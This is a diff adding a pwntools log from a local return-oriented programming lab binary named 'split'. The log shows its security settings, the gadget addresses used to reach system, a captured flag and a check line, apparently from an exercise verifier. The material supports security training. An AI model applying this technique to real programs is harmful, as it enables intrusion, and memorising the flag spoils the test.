@@ -1,0 +1,22 @@
+[*] '/root/techlabs/verify-pwn-b/6.4/split'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    Stripped:   No
+    Debuginfo:  Yes
+[x] Starting local process './split'
+[+] Starting local process './split': pid 428999
+[*] Loading gadgets for '/root/techlabs/verify-pwn-b/6.4/split'
+[*] pop rdi ; ret = 0x40116c
+[*] usefulString  = 0x404030
+[*] system@plt     = 0x401030
+[x] Receiving all data
+[x] Receiving all data: 1B
+[x] Receiving all data: 45B
+[+] Receiving all data: Done (45B)
+[*] Stopped process './split' (pid 428999)
+ FLAG{rop_emporium_local_equivalent_p6_2026}
+
+[+] split OK: da in flag
